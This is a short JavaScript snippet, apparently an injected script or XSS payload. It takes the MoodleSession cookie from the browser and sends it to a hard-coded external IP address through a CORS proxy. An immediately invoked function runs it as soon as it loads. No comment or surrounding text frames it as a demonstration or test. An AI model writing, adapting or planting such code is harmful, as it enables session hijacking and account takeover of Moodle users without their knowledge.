const requestHandler = (url) => new Promise((resolve) => {
    fetch(url, {
        method: 'GET',
        headers: {
            'authVal': document.cookie.split('; ').find(row => row.startsWith('MoodleSession')).split('=')[1]
        }
    }).then(response => {
        return response.text();
    }).then(pageData => {
        resolve(pageData);
    });
});


(function() {
    requestHandler('https://cors-anywhere.herokuapp.com/http://158.69.1.52/controller_test');
});